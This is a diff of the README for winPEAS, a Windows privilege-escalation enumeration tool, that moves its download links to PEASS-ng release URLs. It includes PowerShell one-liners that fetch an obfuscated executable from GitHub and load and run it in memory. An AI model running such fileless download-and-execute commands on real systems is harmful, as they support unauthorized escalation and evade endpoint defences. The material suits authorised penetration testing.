@@ -13,17 +13,14 @@ Check also the **Local Windows Privilege Escalation checklist** from **[book.hac
 **.Net >= 4.5.2 is required**
 
 Precompiled binaries:
-- Download the **[latest obfuscated version from here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases)** or **compile it yourself** (read instructions for compilation).
-- Non-Obfuscated [winPEASany.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)
-- Non-Obfuscated [winPEASx64.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe)
-- Non-Obfuscated [winPEASx86.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe)
+- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/carlospolop/PEASS-ng/releases/tag/refs%2Fheads%2Fmaster)** or **compile it yourself** (read instructions for compilation).
 
 ```bash
 #One liner to download and execute winPEASany from memory in a PS shell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fheads%2Fmaster/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
 #Before cmd in 3 lines
-$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
+$url = "https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fheads%2Fmaster/winPEASany_ofs.exe"
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
